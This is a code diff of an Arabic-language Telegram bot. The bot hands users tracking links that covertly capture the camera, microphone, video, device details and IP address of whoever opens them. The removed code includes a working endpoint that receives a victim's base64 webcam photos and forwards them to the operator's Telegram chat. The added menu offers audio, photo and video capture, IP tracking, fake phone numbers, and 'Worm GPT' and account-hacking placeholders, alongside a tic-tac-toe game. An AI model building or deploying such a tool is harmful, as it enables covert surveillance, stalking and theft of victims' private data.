@@ -1,71 +1,164 @@
-import os, base64, asyncio
-from contextlib import asynccontextmanager
-from fastapi import FastAPI, HTTPException
-from fastapi.responses import HTMLResponse
-from pydantic import BaseModel
-from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, BufferedInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from aiogram.client.default import DefaultBotProperties
+import os
+import random
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-PUBLIC_URL = os.environ.get("PUBLIC_URL", "")
+TOKEN = "YOUR_BOT_TOKEN_HERE"
+WEB_URL = "https://your-app-name.up.railway.app"
+DEVELOPER_URL = "https://t.me/Y_TZZZZ"
 
-bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
-dp = Dispatcher()
+# حالات لعبة XO
+xo_games = {}
 
-# 1. رسالة الترحيب مع زر الاختراق
-@dp.message(F.text == "/start")
-async def start(msg: Message):
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💀 اختراق الكاميرا", callback_data="get_link")]
-    ])
-    await msg.answer("مرحباً بك في البوت الاحترافي.\nاختر من القائمة:", reply_markup=kb)
+def get_main_menu():
+    keyboard = [
+        [InlineKeyboardButton("🎙️ تسجيل الصوت", callback_data="audio"), InlineKeyboardButton("📸 التقاط صورة", callback_data="photo")],
+        [InlineKeyboardButton("🎥 تسجيل فيديو", callback_data="video"), InlineKeyboardButton("🕵️‍♂️ معلومات الجهاز", callback_data="info")],
+        [InlineKeyboardButton("🎮 لعبة XO", callback_data="xo"), InlineKeyboardButton("🌐 تتبع IP", callback_data="iptrack")],
+        [InlineKeyboardButton("📞 ارقام وهمية", callback_data="fakenum"), InlineKeyboardButton("👨‍💻 التواصل مع المطور", url=DEVELOPER_URL)],
+        [InlineKeyboardButton("➕ المميزات الأخرى", callback_data="more")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
 
-# 2. عند الضغط على الزر، يرسل الرابط فقط
-@dp.callback_query(F.data == "get_link")
-async def send_link(cb: CallbackQuery):
-    user_id = cb.from_user.id
-    link = f"{PUBLIC_URL}/?chatId={user_id}"
-    await cb.message.answer(link, disable_web_page_preview=True)
-    await cb.answer()
+def get_more_menu():
+    keyboard = [
+        [InlineKeyboardButton("📧 انشاء ايميل", callback_data="email"), InlineKeyboardButton("🖼️ توليد الصور", callback_data="genimg")],
+        [InlineKeyboardButton("🤖 Worm GPT", callback_data="gpt"), InlineKeyboardButton("📱 اختراق حساب", callback_data="hack")],
+        [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
 
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    polling = asyncio.create_task(dp.start_polling(bot))
-    yield
-    polling.cancel()
-    await bot.session.close()
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "مرحباً بك اختر من القائمة:",
+        reply_markup=get_main_menu()
+    )
 
-app = FastAPI(lifespan=lifespan)
+# --- منطق لعبة XO ---
+def render_xo_board(board):
+    keyboard = []
+    for i in range(0, 9, 3):
+        row = []
+        for j in range(3):
+            cell = board[i + j]
+            display = cell if cell != " " else "⬜"
+            row.append(InlineKeyboardButton(display, callback_data=f"xo_move_{i+j}"))
+        keyboard.append(row)
+    keyboard.append([InlineKeyboardButton("🔙 إلغاء", callback_data="xo_quit")])
+    return InlineKeyboardMarkup(keyboard)
 
-@app.get("/", response_class=HTMLResponse)
-async def index():
-    with open("webapp/index.html", "r", encoding="utf-8") as f:
-        return f.read()
+def check_winner(board):
+    win_conditions = [
+        [0, 1, 2], [3, 4, 5], [6, 7, 8], # صفوف
+        [0, 3, 6], [1, 4, 7], [2, 5, 8], # أعمدة
+        [0, 4, 8], [2, 4, 6]             # أقطار
+    ]
+    for cond in win_conditions:
+        if board[cond[0]] == board[cond[1]] == board[cond[2]] != " ":
+            return board[cond[0]]
+    if " " not in board:
+        return "Tie"
+    return None
 
-class PhotoPayload(BaseModel):
-    chat_id: str
-    image_b64: str
-
-@app.post("/api/photo")
-async def receive_photo(p: PhotoPayload):
-    if not p.image_b64.startswith("data:image/"):
-        raise HTTPException(400, "Invalid image")
+async def xo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    user_id = query.from_user.id
     
-    _, b64 = p.image_b64.split(",", 1)
-    raw = base64.b64decode(b64)
-    
-    try:
-        await bot.send_photo(
-            chat_id=p.chat_id,
-            photo=BufferedInputFile(raw, filename="capture.jpg"),
-            caption="📸 تم التقاط الصورة."
-        )
-    except Exception as e:
-        raise HTTPException(500, str(e))
+    if query.data == "xo":
+        xo_games[user_id] = [" "]*9
+        await query.edit_message_text("🎮 لعبة XO\nتلعب X ضد البوت (O):", reply_markup=render_xo_board(xo_games[user_id]))
+        return
+
+    if query.data == "xo_quit":
+        del xo_games[user_id]
+        await query.edit_message_text("تم إلغاء اللعبة.", reply_markup=get_main_menu())
+        return
+
+    if query.data.startswith("xo_move_"):
+        if user_id not in xo_games:
+            await query.answer("اللعبة انتهت، ابدأ لعبة جديدة.")
+            return
         
-    return {"ok": True}
+        idx = int(query.data.split("_")[-1])
+        board = xo_games[user_id]
+        
+        if board[idx] != " ":
+            await query.answer("هذا المربع ممتلئ!")
+            return
+            
+        board[idx] = "❌" # حركة اللاعب
+        
+        winner = check_winner(board)
+        if winner:
+            await query.edit_message_text(f"النتيجة: {winner}!", reply_markup=get_main_menu())
+            del xo_games[user_id]
+            return
 
-if __name__ == "__main__":
-    import uvicorn
-    uvicorn.run("main:app", host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
+        # حركة البوت
+        empty_spots = [i for i, spot in enumerate(board) if spot == " "]
+        if empty_spots:
+            bot_move = random.choice(empty_spots)
+            board[bot_move] = "⭕"
+            
+        winner = check_winner(board)
+        if winner:
+            if winner == "Tie":
+                await query.edit_message_text("تعادل! 🤝", reply_markup=get_main_menu())
+            else:
+                await query.edit_message_text(f"النتيجة: {winner}!", reply_markup=get_main_menu())
+            del xo_games[user_id]
+        else:
+            await query.edit_message_text("دورك (X):", reply_markup=render_xo_board(board))
+
+# --- معالج الأزرار ---
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    user_id = query.from_user.id
+
+    # التعامل مع لعبة XO
+    if data == "xo" or data.startswith("xo_move") or data == "xo_quit":
+        await xo_handler(update, context)
+        return
+
+    # القوائم
+    if data == "back":
+        await query.edit_message_text("مرحباً بك اختر من القائمة:", reply_markup=get_main_menu())
+        return
+    elif data == "more":
+        await query.edit_message_text("اختر ميزة إضافية:", reply_markup=get_more_menu())
+        return
+
+    # توليد أرقام وهمية
+    if data == "fakenum":
+        country = random.choice(["+1", "+44", "+966", "+213", "+20"])
+        number = f"{country} {random.randint(100, 999)} {random.randint(100, 999)} {random.randint(1000, 9999)}"
+        await query.edit_message_text(f"📞 رقم وهمي جاهز:\n`{number}`", parse_mode="Markdown", reply_markup=get_main_menu())
+        return
+
+    # الميزات التي تحتاج رابط الويب
+    if data in ["audio", "photo", "video", "info", "iptrack"]:
+        link = f"{WEB_URL}/?chatId={user_id}&type={data}"
+        await query.edit_message_text(
+            f"اضغط على الرابط لبدء العملية:\n{link}\n\nانتظر قليلاً حتى يتم التحميل...",
+            reply_markup=get_main_menu()
+        )
+        return
+
+    # مميزات أخرى (نصية)
+    if data == "email":
+        await query.edit_message_text("📧 ميزة إنشاء الإيميل قيد التطوير.", reply_markup=get_more_menu())
+    elif data == "genimg":
+        await query.edit_message_text("🖼️ ميزة توليد الصور قيد التطوير.", reply_markup=get_more_menu())
+    elif data == "gpt":
+        await query.edit_message_text("🤖 Worm GPT قيد التطوير.", reply_markup=get_more_menu())
+    elif data == "hack":
+        await query.edit_message_text("📱 ميزة اختراق الحساب قيد التطوير.", reply_markup=get_more_menu())
+
+if __name__ == '__main__':
+    app = ApplicationBuilder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    print("البوت يعمل الآن...")
+    app.run_polling()
